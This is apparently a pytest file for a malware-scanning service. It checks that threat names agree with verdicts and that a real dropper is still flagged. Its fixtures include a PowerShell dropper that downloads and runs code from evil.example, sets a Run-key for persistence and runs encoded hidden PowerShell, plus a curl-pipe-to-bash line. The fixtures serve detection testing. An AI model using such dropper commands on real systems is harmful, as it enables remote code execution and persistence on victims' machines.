"""A green badge beside the word "Downloader".

`threat_name` is derived from the capabilities near the top of `classify`;
`verdict` is decided at the bottom from the score and the detection panel.
Nothing reconciled them, so a report could show both and have them disagree.

Measured on the live deployment, 43 of 200 clean jobs carried a name that
accused them — including Microsoft-signed Sysinternals binaries:

    PsGetsid.exe      clean   Win32.Downloader.OverlayPresent    20.7
    tcpview.exe       clean   Win32.Downloader.TlsCallbacks      21.8
    autorunsc.exe     clean   Win32.Downloader.TlsCallbacks      22.4
    psshutdown.exe    clean   Win32.Downloader.OverlayPresent    21.4

An overlay, TLS callbacks and high entropy are how installers are built. This is
the same mistake `verdict.py` already fixed once for the no-capability case, and
its own comment describes it: naming a sample after its worst informational
signal is how a Microsoft-signed binary became `Win32.Downloader.TimestampAnomaly`.

The mirror was there too: 17 suspicious jobs and 1 malicious job named
`<Platform>.Clean` — a verdict that flags the sample beside a name that clears
it.
"""
from __future__ import annotations

import pytest

from tests.test_api import _poll_until_done, _submit

#: A signed-installer shape: high entropy, an overlay, nothing it can DO.
INSTALLER = b"MZ" + b"\x00" * 200 + bytes(range(256)) * 160

DROPPER = (
    b"$c = New-Object Net.WebClient\n"
    b"$c.DownloadFile('http://evil.example/p.exe', \"$env:TEMP\\p.exe\")\n"
    b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/s')\n"
    b"New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    b" -Name Upd -Value 'p.exe'\n"
    b"powershell -enc SQBFAFgA -w hidden\n"
)

CASES = [
    ("note.txt", b"# just a note\n"),
    ("installer.exe", INSTALLER),
    ("dropper.ps1", DROPPER),
    ("bundle.zip", None),  # built below
    ("report.pdf", b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"),
]


def _zip_bytes() -> bytes:
    import io
    import zipfile

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("docs/README.txt", "Install with: curl https://x.example/i.sh | bash\n")
        archive.writestr("bin/tool.ps1", "Write-Host hello\n")
    return buffer.getvalue()


@pytest.mark.parametrize("name,payload", CASES)
def test_the_name_never_contradicts_the_verdict(client, auth, name, payload) -> None:
    public_id = _submit(client, auth, name, payload if payload is not None else _zip_bytes())
    detail = _poll_until_done(client, auth, public_id)
    verdict = detail["verdict"]
    label, threat = verdict["verdict"], verdict["threat_name"]

    if label == "clean":
        assert threat.endswith(".Clean"), (
            f"{name} is CLEAN and named {threat!r} — a green badge beside an accusation"
        )
        assert verdict["category"] == "Clean", verdict
    else:
        assert not threat.endswith(".Clean"), (
            f"{name} is {label.upper()} and named {threat!r} — a flag beside a clearance"
        )


@pytest.mark.parametrize("name,payload", CASES)
def test_a_detecting_engine_row_reports_the_same_name(client, auth, name, payload) -> None:
    """The panel rows carry the name too, and they were built before the verdict
    reconciled it — so a row could report a name the headline no longer used."""
    public_id = _submit(client, auth, name, payload if payload is not None else _zip_bytes())
    detail = _poll_until_done(client, auth, public_id)
    verdict = detail["verdict"]
    for row in verdict["engines"]:
        if not row["detected"] or str(row["engine"]).startswith("CS-YARA"):
            continue
        if row["result"] in ("undetected", "Suspicious.Indicator"):
            continue
        assert row["result"] == verdict["threat_name"], (
            f"{name}: engine {row['engine']} reports {row['result']!r} "
            f"while the verdict says {verdict['threat_name']!r}"
        )


def test_a_real_dropper_is_still_named_for_what_it_does(client, auth) -> None:
    """Reconciling the two must not blunt the one that was right."""
    public_id = _submit(client, auth, "dropper.ps1", DROPPER)
    detail = _poll_until_done(client, auth, public_id)
    verdict = detail["verdict"]
    assert verdict["verdict"] == "malicious", verdict
    assert verdict["category"] not in ("Clean", "Suspicious", "Malware"), (
        f"a working dropper should be named for its capability, got {verdict['threat_name']}"
    )


def test_a_plain_note_is_clean_and_says_so(client, auth) -> None:
    public_id = _submit(client, auth, "note.txt", b"# just a note\nnothing to see\n")
    detail = _poll_until_done(client, auth, public_id)
    assert detail["verdict"]["threat_name"].endswith(".Clean")
    assert detail["verdict"]["verdict"] == "clean"
